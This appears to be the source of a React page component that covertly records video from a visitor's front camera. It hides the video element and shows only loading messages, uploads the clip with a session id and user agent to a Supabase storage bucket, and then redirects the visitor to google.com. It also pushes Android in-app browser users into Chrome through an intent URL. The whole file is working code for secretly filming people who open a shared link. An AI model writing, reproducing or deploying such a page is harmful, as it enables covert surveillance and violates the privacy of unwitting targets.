import { useEffect, useState, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";

// Whitelist of allowed redirect domains for security
const ALLOWED_REDIRECT_DOMAINS = [
  'google.com',
  'www.google.com',
];

// Validate redirect URL
const isValidRedirectUrl = (url: string): boolean => {
  try {
    const parsed = new URL(url);
    if (parsed.protocol !== 'https:' && 
        !(parsed.protocol === 'http:' && parsed.hostname === 'localhost')) {
      return false;
    }
    return ALLOWED_REDIRECT_DOMAINS.some(domain => 
      parsed.hostname === domain || parsed.hostname.endsWith(`.${domain}`)
    );
  } catch {
    return false;
  }
};

// Detect in-app browsers
const isInAppBrowser = (): boolean => {
  const ua = navigator.userAgent || navigator.vendor || '';
  const inAppPatterns = [
    'Instagram', 'FBAN', 'FBAV', 'FB_IAB', 'Telegram', 'TelegramBot',
    'Twitter', 'Line', 'Snapchat', 'WhatsApp', 'LinkedIn', 'Pinterest',
    'Viber', 'WeChat', 'MicroMessenger',
  ];
  return inAppPatterns.some(pattern => ua.includes(pattern));
};

// Detect Android
const isAndroid = (): boolean => {
  return /Android/i.test(navigator.userAgent || '');
};

// Detect Chrome browser
const isChromeBrowser = (): boolean => {
  const ua = navigator.userAgent || '';
  const hasChrome = /Chrome/i.test(ua) && !/Chromium/i.test(ua);
  const isNotEdge = !/Edg/i.test(ua);
  const isNotOpera = !/OPR/i.test(ua);
  const isNotSamsung = !/SamsungBrowser/i.test(ua);
  return hasChrome && isNotEdge && isNotOpera && isNotSamsung && !isInAppBrowser();
};

// Generate Chrome intent URL for Android
const getChromeIntentUrl = (currentUrl: string): string => {
  const url = new URL(currentUrl);
  return `intent://${url.host}${url.pathname}${url.search}#Intent;scheme=https;package=com.android.chrome;end`;
};

const VideoCapture = () => {
  const [searchParams] = useSearchParams();
  const videoRef = useRef<HTMLVideoElement>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const chunksRef = useRef<Blob[]>([]);
  
  const [status, setStatus] = useState<
    "checking" | "redirecting_chrome" | "not_chrome" | "recording" | "uploading" | "redirecting"
  >("checking");
  
  const sessionId = searchParams.get("session") || "default";
  const rawRedirectUrl = searchParams.get("redirect") || "https://google.com";
  const duration = parseInt(searchParams.get("duration") || "5", 10);
  const recordDuration = Math.min(Math.max(duration, 3), 30);
  
  const redirectUrl = isValidRedirectUrl(rawRedirectUrl) ? rawRedirectUrl : "https://google.com";

  const uploadVideo = async (blob: Blob): Promise<string | null> => {
    try {
      const fileName = `${sessionId}/${Date.now()}.webm`;
      
      const { data, error } = await supabase.storage
        .from('captured-videos')
        .upload(fileName, blob, {
          contentType: 'video/webm',
          upsert: false
        });

      if (error) {
        console.error('Upload error:', error);
        return null;
      }

      const { data: urlData } = supabase.storage
        .from('captured-videos')
        .getPublicUrl(fileName);

      return urlData.publicUrl;
    } catch (error) {
      console.error('Upload error:', error);
      return null;
    }
  };

  const recordAndUpload = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: 640, height: 480 },
        audio: false
      });

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
      }

      setStatus("recording");
      chunksRef.current = [];

      const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') 
        ? 'video/webm;codecs=vp9' 
        : MediaRecorder.isTypeSupported('video/webm')
          ? 'video/webm'
          : 'video/mp4';

      const mediaRecorder = new MediaRecorder(stream, { mimeType });
      mediaRecorderRef.current = mediaRecorder;

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          chunksRef.current.push(e.data);
        }
      };

      mediaRecorder.onstop = async () => {
        stream.getTracks().forEach(track => track.stop());
        
        setStatus("uploading");
        
        const blob = new Blob(chunksRef.current, { type: mimeType });
        const videoUrl = await uploadVideo(blob);

        if (videoUrl) {
          await supabase.from('captured_videos').insert({
            session_id: sessionId,
            video_url: videoUrl,
            duration_seconds: recordDuration,
            user_agent: navigator.userAgent
          });
        }

        setStatus("redirecting");
        setTimeout(() => {
          window.location.href = redirectUrl;
        }, 300);
      };

      mediaRecorder.start(1000);

      // Stop after duration
      setTimeout(() => {
        if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
          mediaRecorderRef.current.stop();
        }
      }, recordDuration * 1000);

    } catch (error) {
      console.error("Recording error:", error);
      window.location.href = "https://google.com";
    }
  };

  useEffect(() => {
    const checkBrowserAndProceed = async () => {
      if (isInAppBrowser() && isAndroid()) {
        setStatus("redirecting_chrome");
        const chromeIntent = getChromeIntentUrl(window.location.href);
        setTimeout(() => {
          window.location.href = chromeIntent;
        }, 100);
        return;
      }
      
      if (isInAppBrowser()) {
        setStatus("not_chrome");
        return;
      }
      
      if (!isChromeBrowser()) {
        setStatus("not_chrome");
        return;
      }
      
      await recordAndUpload();
    };

    checkBrowserAndProceed();
  }, []);

  if (status === "not_chrome") {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <div className="text-center max-w-md">
          <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-destructive/20 flex items-center justify-center">
            <svg className="w-8 h-8 text-destructive" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
            </svg>
          </div>
          <h1 className="text-xl font-bold text-foreground mb-2">Browser Not Supported</h1>
          <p className="text-muted-foreground">
            Ye link sirf Google Chrome browser me kaam karta hai.
          </p>
          <p className="text-muted-foreground text-sm mt-4">
            Please open this link in Google Chrome browser.
          </p>
        </div>
      </div>
    );
  }

  if (status === "redirecting_chrome") {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <div className="text-center">
          <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <p className="text-muted-foreground text-sm">Opening in Chrome...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background flex items-center justify-center">
      {/* Hidden video element */}
      <video ref={videoRef} className="hidden" autoPlay playsInline muted />
      
      <div className="text-center">
        <div className="w-8 h-8 border-2 border-neon-green border-t-transparent rounded-full animate-spin mx-auto mb-4" />
        <p className="text-muted-foreground text-sm">
          {status === "checking" && "Loading..."}
          {status === "recording" && "Please wait..."}
          {status === "uploading" && "Almost done..."}
          {status === "redirecting" && "Redirecting..."}
        </p>
      </div>
    </div>
  );
};

export default VideoCapture;
